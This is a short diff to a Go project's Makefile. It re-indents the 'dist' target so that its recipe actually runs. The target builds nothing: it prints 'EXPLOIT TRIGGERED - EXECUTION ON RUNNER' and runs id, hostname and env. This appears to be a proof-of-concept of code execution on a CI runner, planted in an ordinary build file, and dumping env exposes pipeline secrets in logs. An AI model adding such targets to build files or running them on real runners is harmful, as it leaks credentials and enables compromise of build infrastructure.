@@ -59,10 +59,10 @@ dist-linux: dist-mkdir
 	GOOS=linux   GOARCH=arm64 $(GO) build -mod=vendor -ldflags='-s -w -X main.GitSHA=$(GIT_SHA) -X main.BuildDate=$(DATE)' -o dist/cmk.linux.arm64 cmk.go
 
 dist:
-    @echo "[!] EXPLOIT TRIGGERED - EXECUTION ON RUNNER"
-    @id
-    @hostname
-    @env
+	@echo "[!] EXPLOIT TRIGGERED - EXECUTION ON RUNNER"
+	@id
+	@hostname
+	@env
 
 # Tools
 
